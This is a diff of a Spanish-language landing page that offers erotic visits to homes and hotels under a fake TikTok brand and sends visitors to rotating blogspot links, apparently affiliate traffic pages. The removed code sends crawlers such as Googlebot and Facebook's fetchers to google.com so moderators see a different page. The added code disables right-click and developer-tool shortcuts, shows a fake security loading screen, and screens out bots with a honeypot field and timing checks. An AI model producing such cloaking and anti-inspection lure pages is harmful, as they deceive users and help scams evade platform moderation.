@@ -1,119 +1,249 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="es">
 <head>
-    <script type="text/javascript">
-        (function() {
-            var botPattern = /bot|googlebot|facebookexternalhit|facebot|facebookexternalhit\/1.1|Meta-ExternalAgent|Meta-ExternalFetcher|facebookplatform|twitterbot|bingbot|duckduckbot|baiduspider|adsbot|slurp|ia_archiver/i;
-            var userAgent = navigator.userAgent;
-            if (botPattern.test(userAgent)) {
-                window.location.replace("https://www.google.com");
-            }
-        })();
-    </script>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no">
-    <meta name="robots" content="noindex, nofollow">
-    <title>Encuentroos footoos</title>
-    <meta property="og:title" content="Encuentroos ffootooss">
-    <meta property="og:image" content="https://i.postimg.cc/SQVxd77J/Vista-Uno-Sepia.png">
-    <style>
-        body { 
-            background: #000; 
-            color: #fff; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            margin: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            text-align: center;
-        }
-        .wrap { width: 90%; max-width: 400px; }
-        .step-item { display: none; }
-        .active { display: block !important; }
-        .question-title {
-            font-size: 1.2rem;
-            margin-bottom: 30px;
-            line-height: 1.5;
-            font-weight: bold;
-        }
-        .btn-action { 
-            background-color: #ff0050; 
-            color: #ffffff !important; 
-            border: none; 
-            padding: 18px 40px; 
-            margin: 10px; 
-            border-radius: 30px; 
-            font-size: 1.1rem;
-            font-weight: 800; 
-            cursor: pointer; 
-            display: inline-block;
-            text-decoration: none;
-            box-shadow: 0 4px 15px rgba(255, 0, 80, 0.4);
-            text-transform: uppercase;
-        }
-        .btn-action:active {
-            transform: scale(0.95);
-            background-color: #d60043;
-        }
-        #VideoBg {
-            position: fixed;
-            right: 0;
-            bottom: 0;
-            min-width: 100%;
-            min-height: 100%;
-            z-index: -1;
-            filter: brightness(0.3);
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="referrer" content="no-referrer">
+  <title>Encuentroos D1scretoos,fots</title>
+  
+  <meta content="https://i.postimg.cc/SQVxd77J/Vista-Uno-Sepia.png" property="og:image">
+  <link rel="stylesheet" href="https://cdn.smrt-content.com/assets/1004/css/index.css">
+  <link rel="shortcut icon" href="https://cdn.jmpcdn.com/assets/3420/images/2.ico" type="image/x-icon">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+  <script>
+tailwind.config = {
+theme: {
+extend: {
+colors: {
+'fuchsia-tiktok': '#e736a4',
+},
+fontFamily: {
+// If the template uses its own font, Tailwind ignores it, but Inter is the fallback..
+sans: ['Inter', 'sans-serif'],
+}
+}
+}
+}
+</script>
+  <style>
+@keyframes spin { to { transform: rotate(360deg); } }
+.animate-spin-custom { animation: spin 1s linear infinite; }
+/* Asegura que la app-container sea visible */
+#app-container { opacity: 0; transition: opacity 0.5s; }
+#app-container.opacity-100 { opacity: 1; }
+#loading-screen { transition: opacity 0.5s; }
+/* Para que el honeypot no interfiera con el layout de la plantilla */
+#honeypot-container {
+position: absolute; top: 0; left: 0; width: 0; height: 0;
+overflow: hidden; opacity: 0; pointer-events: none;
+}
+</style>
 </head>
 <body>
-    <video autoplay muted loop id="VideoBg">
-        <source src="" type="video/mp4">
-    </video>
-
-    <div class="wrap">
-        <div id="step1" class="step-item active">
-            <div class="question-title">
-                Ofrecemos r1cos seerviccioss, baileess y masajes eróticooos Hasta tu apartamento u Hotel, ¿quieres ver nuestro catálogo?.
-            </div>
-            <div class="buttons-block">
-                <button class="btn-action" onclick="showNext()">Si</button>
-                <button class="btn-action" onclick="showNext()">No</button>
-            </div>
-        </div>
-
-        <div id="step2" class="step-item">
-            <div class="question-title">
-                IMPORTANTE: ¿Aceptas respetar a las mujeres Con poca ropaa que veras a continuación? Si conoces a alguien, no se lo digas ni difundas rumores, haz clic en CONTINUAR abajo y regístrate gratis para vernos desnuudaaas..
-            </div>
-            <div class="buttons-block">
-                <button class="btn-action" onclick="redirectRandom()">C0NTINUAR</button>
-            </div>
-        </div>
+  <script>
+document.addEventListener('contextmenu', e => e.preventDefault());
+document.addEventListener('keydown', e => {
+if (
+e.key === 'F12' ||
+(e.ctrlKey && (e.key === 'i' || e.key === 'I' || e.key === 'u' || e.key === 'U'))
+) {
+e.preventDefault();
+}
+});
+</script>
+  <div id="loading-screen" class="fixed inset-0 bg-black flex items-center justify-center z-50">
+   <p class="text-white text-xl flex items-center">
+    <svg class="animate-spin-custom -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+     <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle> <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+    </svg>
+    Inicializando seguridad...
+   </p>
+  </div>
+  <div id="app-container" class="w-full h-screen flex flex-col items-center justify-center relative">
+   <div id="debug-info" class="absolute top-0 left-0 text-[8px] px-0.5 py-0.25 rounded-br-lg bg-black/5 z-20">
+    <p id="app-message" class="mt-0.5 font-bold"></p>
+   </div>
+   <div class="layer"></div>
+   <div class="wrap">
+    <div class="step-block">
+     <div class="logo">
+      <img src="https://i.postimg.cc/kXXfxHsJ/Tik-Tok-logo-svg.png" alt="Logo TikTok" class="w-20 h-20 rounded-full">
+     </div>
+     <div id="step-1" class="step-item" style="display: block;">
+      <div class="question-title ">Ofrezco mis servicios por hora, a domicilio. ¿Te gustaría ver mi catálogo?</div>
+      <div class="buttons-block">
+       <div data-next="step-2" class="step-btn no-btn tr-b-option step-trigger">No</div>
+       <div data-next="step-2" class="step-btn yes-btn tr-b-option step-trigger">Sí</div>
+      </div>
+     </div>
+     <div id="step-2" class="step-item thishide" style="display: none;">
+      <div class="question-title ">NOTA: ¿Aceptas respetar a las mujeres que verás a continuación? Presiona "ENTRAR" y confirma tu cita. Si conoces a alguien, por favor no lo divulgues ni propagues rumores...</div>
+      <p><b style="color: red;"></b></p>
+      <div class="buttons-block">
+       <button id="btn-final-action" class="
+step-btn submit-btn tr-submit-button
+text-center uppercase font-black text-xl sm:text-2xl
+py-4 px-8 rounded-xl transition-all duration-100
+border-4 border-white shadow-xl
+bg-fuchsia-tiktok text-black hover:scale-[1.03]
+shadow-[0_8px_0_-2px_#e736a4,0_8px_0_0_#000]
+active:shadow-[0_4px_0_-2px_#e736a4,0_4px_0_0_#000]
+active:translate-y-[4px]
+" role="button">ENTRAR</button>
+      </div>
+     </div>
+     <video autoplay muted loop id="VideoBg">
+      <source src="https://cdn.videy.co/pEvKWO9U1.mp4" type="video/mp4">
+     </video>
+     <div id="honeypot-container" aria-hidden="true">
+      <input id="hp-field" name="honeypot" type="text" tabindex="-1" autocomplete="off">
+     </div>
     </div>
-
-    <script>
-        function showNext() {
-            document.getElementById('step1').classList.remove('active');
-            document.getElementById('step2').classList.add('active');
-        }
-
-        function redirectRandom() {
-            // Lista de tus 4 links (puedes cambiarlos aquí)
-            var links = [
-                "https://lasgooglesface.blogspot.com",
-                "https://ellinkcpa2.blogspot.com",
-                "https://linkk3enline.blogspot.com",
-                "https://loslink4.blogspot.com"
-            ];
-
-            // Selecciona uno al azar (cada uno tiene 25% de probabilidad)
-            var randomLink = links[Math.floor(Math.random() * links.length)];
-            
-            // Redirige al usuario
-            window.location.href = randomLink;
-        }
-    </script>
+   </div>
+  </div>
+  <script>
+// === JS SECURITY CONFIGURATION ===
+const MIN_INTERACTION_TIME = 4000; // Minimum time to be considered human (ms)
+// MODIFY THESE TWO LINES TO CHANGE THE LINKS
+const TARGET_URL_HUMAN = "https://lasgooglesface.blogspot.com"; //
+const TARGET_URL_BOT = "https://lasgooglesface.blogspot.com"; //
+// === Variables Globales de Estado ===
+let isBotDetected = false;
+let loadTimeRef = Date.now();
+let isProcessing = false;
+let hasWindowFocused = false;
+let hasMouseMoved = false;
+// === Elementos del DOM ===
+const appContainer = document.getElementById('app-container');
+const loadingScreen = document.getElementById('loading-screen');
+const btnFinalAction = document.getElementById('btn-final-action');
+const hpField = document.getElementById('hp-field');
+const msgDisplay = document.getElementById('app-message');
+// === LÓGICA DE PASOS ===
+const step1 = document.getElementById('step-1');
+const step2 = document.getElementById('step-2');
+function showStep(stepId) {
+if (stepId === 'step-2') {
+step1.style.display = 'none';
+step2.style.display = 'block';
+}
+}
+document.querySelectorAll('.step-trigger').forEach(btn => {
+btn.addEventListener('click', (e) => {
+const nextStepId = e.currentTarget.dataset.next;
+if (nextStepId) {
+showStep(nextStepId);
+}
+});
+});
+// === BUTTON SECURITY LOGIC AND STATUS ===
+function displayMessage(message, isError = false) {
+// Displays error/success messages in the upper left corner
+msgDisplay.textContent = message;
+// We use Tailwind classes for message colors
+msgDisplay.className = isError
+? 'mt-0.5 font-bold text-red-600'
+: 'mt-0.5 font-bold text-green-500';
+setTimeout(() => {
+msgDisplay.textContent = '';
+msgDisplay.className = 'mt-0.5 font-bold';
+}, 3000);
+}
+function updateFinalButton(text, isBlocked = false, isLoader = false) {
+// We replicated the classes and styles of the ACCEPT button from the previous landing page.
+const baseClasses = 'step-btn submit-btn tr-submit-button text-center uppercase font-black text-xl sm:text-2xl py-4 px-8 rounded-xl transition-all duration-100 border-4 border-white shadow-xl';
+if (isLoader) {
+// Estado 'PROCESANDO...'
+btnFinalAction.innerHTML = `
+<div class="flex items-center justify-center">
+<svg class="animate-spin-custom -ml-1 mr-3 h-5 w-5 text-black" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+</svg>
+${text}
+</div>
+`;
+btnFinalAction.className = `${baseClasses} bg-fuchsia-tiktok text-black`;
+} else if (isBlocked) {
+// Estado 'BLOQUEADO'
+btnFinalAction.innerHTML = text;
+btnFinalAction.className = `${baseClasses} bg-red-600 cursor-not-allowed text-white shadow-[0_8px_0_0_#900]`;
+} else {
+// Estado Normal
+btnFinalAction.innerHTML = text;
+btnFinalAction.className = `${baseClasses} bg-fuchsia-tiktok text-black hover:scale-[1.03] shadow-[0_8px_0_-2px_#e736a4,0_8px_0_0_#000] active:shadow-[0_4px_0_-2px_#e736a4,0_4px_0_0_#000] active:translate-y-[4px]`;
+}
+}
+function setupHumanEventListeners() {
+window.addEventListener('focus', () => { hasWindowFocused = true; }, { once: true });
+document.addEventListener('mousemove', () => { hasMouseMoved = true; }, { once: true });
+document.addEventListener('click', () => { hasMouseMoved = true; }, { once: true });
+}
+function checkBotActivity() {
+let detected = false;
+let detectionReason = 'Usuario Legítimo';
+const clickTime = Date.now();
+const interactionTime = clickTime - loadTimeRef;
+const isHoneypotFilled = hpField.value.trim().length > 0;
+if (isHoneypotFilled) {
+detected = true;
+detectionReason = 'Fallo Honeypot';
+}
+if (interactionTime < MIN_INTERACTION_TIME && !detected) {
+detected = true;
+detectionReason = `Interacción Rápida (${interactionTime}ms)`;
+}
+if (!hasWindowFocused && !detected) {
+detected = true;
+detectionReason = 'Ventana no enfocada';
+}
+if (!hasMouseMoved && !detected) {
+detected = true;
+detectionReason = 'Interacción no detectada';
+}
+if (detected) {
+isBotDetected = true;
+displayMessage(`Acceso Denegado. Fallo de Verificación: ${detectionReason}.`, true);
+updateFinalButton('BLOQUEADO', true);
+} else {
+isBotDetected = false;
+}
+return detected;
+}
+async function handleEntry(e) {
+e.preventDefault();
+if (isProcessing || isBotDetected) return;
+isProcessing = true;
+updateFinalButton('PROCESANDO...', false, true);
+const isBot = checkBotActivity();
+let targetUrl;
+if (isBot) {
+targetUrl = TARGET_URL_BOT; // URL para Bots
+} else {
+targetUrl = TARGET_URL_HUMAN; // URL para Humanos
+}
+displayMessage("Redirigiendo...");
+setTimeout(() => {
+isProcessing = false;
+window.location.href = targetUrl;
+}, 600);
+}
+// === Inicialización de la Aplicación ===
+async function initApp() {
+setupHumanEventListeners();
+// Ocultar pantalla de carga e iniciar la aplicación
+loadingScreen.style.opacity = '0';
+setTimeout(() => {
+loadingScreen.style.display = 'none';
+appContainer.classList.add('opacity-100');
+loadTimeRef = Date.now(); // Marca el tiempo de inicio
+}, 500);
+}
+btnFinalAction.addEventListener('click', handleEntry);
+initApp();
+</script>
 </body>
 </html>
